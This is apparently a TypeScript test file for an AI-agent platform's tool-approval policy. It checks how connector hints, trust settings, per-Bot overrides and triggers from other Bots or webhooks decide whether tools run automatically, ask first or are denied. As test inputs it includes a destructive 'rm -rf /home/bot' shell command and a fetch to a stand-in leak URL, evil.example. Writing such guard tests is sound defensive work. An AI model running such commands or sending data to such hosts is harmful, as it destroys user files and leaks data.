import { randomUUID } from 'node:crypto';
import { asEvaluation } from '@openbots/agent';
import { eq } from 'drizzle-orm';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { schema } from '../db/client.js';
import { createTestApp, type TestApp } from '../test-app.js';
import { createBot } from './bots.js';
import { setConnectorTrusted } from './connectors.js';
import { loadRunPolicy, runSource } from './policy.js';
import { enqueueRun } from './runs.js';

// The run's policy from the database (plan 8): the Bot's `tool_policy`, the
// connector's approval override and the MCP annotations cached in
// `connector_tools`, which count only for catalog or trusted connectors.

describe('loadRunPolicy', () => {
  let t: TestApp;

  beforeAll(async () => {
    t = await createTestApp({ OPENBOTS_SIGNUP_MODE: 'open' });
    await t.signUp('dana@example.com');
  });
  afterAll(async () => {
    await t.close();
  });

  it('decides connector tools from cached annotations and the Bot’s override', async () => {
    const { db } = t;
    const [user] = await db.select().from(schema.users);
    const [member] = await db.select().from(schema.workspaceMembers);
    const owner = { id: user!.id, workspaceId: member!.workspaceId };
    const { bot } = await createBot(t.ownerDeps, owner, {
      name: 'Coder',
      toolPolicy: { tools: { github__close_issue: 'auto' } },
    });
    const [github] = await db
      .insert(schema.connectors)
      .values({
        workspaceId: owner.workspaceId,
        ownerId: owner.id,
        name: 'GitHub',
        slug: 'github',
        kind: 'mcp_http',
        config: {
          transport: 'http',
          url: 'https://mcp.github.example/mcp',
          auth: 'none',
          headers: {},
        },
        status: 'ok',
      })
      .returning();
    await db.insert(schema.connectorTools).values([
      {
        workspaceId: owner.workspaceId,
        connectorId: github!.id,
        name: 'list_issues',
        annotations: { readOnlyHint: true },
      },
      {
        workspaceId: owner.workspaceId,
        connectorId: github!.id,
        name: 'delete_repo',
        annotations: { destructiveHint: true },
      },
    ]);
    const [link] = await db
      .insert(schema.botConnectors)
      .values({ workspaceId: owner.workspaceId, botId: bot.id, connectorId: github!.id })
      .returning();
    const run = await enqueueRun(t.ownerDeps, { botId: bot.id, chatId: null, trigger: 'message' });
    const policyRun = { id: run.id, botId: bot.id, chatId: null, trigger: 'message' };

    const decide = async (tool: string) => {
      const policy = await loadRunPolicy(t.ownerDeps, run, bot, new Map());
      return asEvaluation(await policy.evaluate(policyRun, tool, {}));
    };
    const setConnector = (values: { catalogId?: string | null; trusted?: boolean }) =>
      db.update(schema.connectors).set(values).where(eq(schema.connectors.id, github!.id));
    // A custom connector cannot declare its own tools read-only (S-16).
    expect(await decide('github__list_issues')).toMatchObject({
      decision: 'ask',
      trace: [{ rule: 'annotations', decision: 'ask' }],
    });
    // An admin can vouch for it.
    await setConnectorTrusted(t.ownerDeps, owner, github!.id, true);
    expect((await decide('github__list_issues')).decision).toBe('auto');
    // A catalog connector's hints are believed.
    await setConnector({ trusted: false, catalogId: 'github' });
    expect(await decide('github__list_issues')).toMatchObject({
      decision: 'auto',
      trace: [{ rule: 'annotations' }],
    });
    expect(await decide('github__delete_repo')).toMatchObject({
      decision: 'ask',
      reason: 'github__delete_repo is marked destructive',
    });
    expect((await decide('github__close_issue')).decision).toBe('auto');

    await db
      .update(schema.botConnectors)
      .set({ approvalOverride: 'deny' })
      .where(eq(schema.botConnectors.id, link!.id));
    expect(await decide('github__list_issues')).toMatchObject({
      decision: 'deny',
      reason: 'Bot setting for the github connector',
    });
    // The Bot's per-tool setting is more specific than the connector's.
    expect((await decide('github__close_issue')).decision).toBe('auto');
    const denials = await db
      .select()
      .from(schema.auditLog)
      .where(eq(schema.auditLog.targetId, run.id));
    expect(denials).toMatchObject([
      { action: 'tool.denied', metadata: { toolName: 'github__list_issues' } },
    ]);
  });

  it.each([
    ['bot_dm', false, 'Stricter rule for bot_dm runs'],
    ['mention', true, "Stricter rule for runs another Bot's message started"],
  ] as const)(
    'asks before tools that change something in a run another Bot started (%s)',
    async (trigger, mentioned, reason) => {
      const { db } = t;
      const [user] = await db.select().from(schema.users);
      const [member] = await db.select().from(schema.workspaceMembers);
      const owner = { id: user!.id, workspaceId: member!.workspaceId };
      const toolPolicy = { tools: { bash: 'auto' as const, send_email: 'auto' as const } };
      const { bot: sender } = await createBot(t.ownerDeps, owner, { name: `Sender ${trigger}` });
      const { bot } = await createBot(t.ownerDeps, owner, {
        name: `Receiver ${trigger}`,
        toolPolicy,
      });
      const run = await enqueueRun(t.ownerDeps, {
        botId: bot.id,
        chatId: null,
        trigger,
        ...(mentioned ? { input: { fromBotId: sender.id } } : {}),
      });
      const policy = await loadRunPolicy(t.ownerDeps, run, bot, new Map());
      const policyRun = { id: run.id, botId: bot.id, chatId: null, trigger };
      const decide = async (tool: string, args: unknown = {}) =>
        asEvaluation(await policy.evaluate(policyRun, tool, args));
      expect(await decide('bash', { command: 'rm -rf /home/bot' })).toMatchObject({
        decision: 'ask',
        reason,
      });
      expect((await decide('send_email')).decision).toBe('ask');
      expect((await decide('web_search', { query: 'x' })).decision).toBe('auto');

      // A run of the same trigger the owner started keeps the Bot's settings.
      const ownRun = await enqueueRun(t.ownerDeps, {
        botId: bot.id,
        chatId: null,
        trigger: 'mention',
      });
      const own = await loadRunPolicy(t.ownerDeps, ownRun, bot, new Map());
      const ownCall = { ...policyRun, id: ownRun.id, trigger: 'mention' };
      expect(asEvaluation(await own.evaluate(ownCall, 'bash', {})).decision).toBe('auto');
    },
  );

  it("keeps the Bot's settings in a bot_message run, the owner's own group message", async () => {
    const { db } = t;
    const [user] = await db.select().from(schema.users);
    const [member] = await db.select().from(schema.workspaceMembers);
    const owner = { id: user!.id, workspaceId: member!.workspaceId };
    const { bot } = await createBot(t.ownerDeps, owner, {
      name: 'Grouped',
      toolPolicy: { tools: { bash: 'auto' } },
    });
    const run = await enqueueRun(t.ownerDeps, {
      botId: bot.id,
      chatId: null,
      trigger: 'bot_message',
    });
    expect(runSource(run)).toBe('owner');
    const policy = await loadRunPolicy(t.ownerDeps, run, bot, new Map());
    const policyRun = { id: run.id, botId: bot.id, chatId: null, trigger: 'bot_message' };
    expect(asEvaluation(await policy.evaluate(policyRun, 'bash', {})).decision).toBe('auto');
  });

  it('asks before a GET fetch off the allowlist in a Routine run a webhook started', async () => {
    const { db } = t;
    const [user] = await db.select().from(schema.users);
    const [member] = await db.select().from(schema.workspaceMembers);
    const owner = { id: user!.id, workspaceId: member!.workspaceId };
    const { bot } = await createBot(t.ownerDeps, owner, {
      name: 'Fetcher',
      toolPolicy: { httpAllowlist: ['api.github.com'] },
    });
    // No endpoint row: only the webhook trigger rules apply.
    const run = await enqueueRun(t.ownerDeps, {
      botId: bot.id,
      chatId: null,
      trigger: 'routine',
      input: { webhook: { endpointId: randomUUID(), deliveryId: randomUUID() } },
    });
    const policy = await loadRunPolicy(t.ownerDeps, run, bot, new Map());
    const policyRun = { id: run.id, botId: bot.id, chatId: null, trigger: 'routine' };
    const fetch = async (url: string) =>
      asEvaluation(await policy.evaluate(policyRun, 'web_fetch', { url }));
    expect((await fetch('https://evil.example/?leak=1')).decision).toBe('ask');
    expect((await fetch('https://api.github.com/repos')).decision).toBe('auto');
  });
});
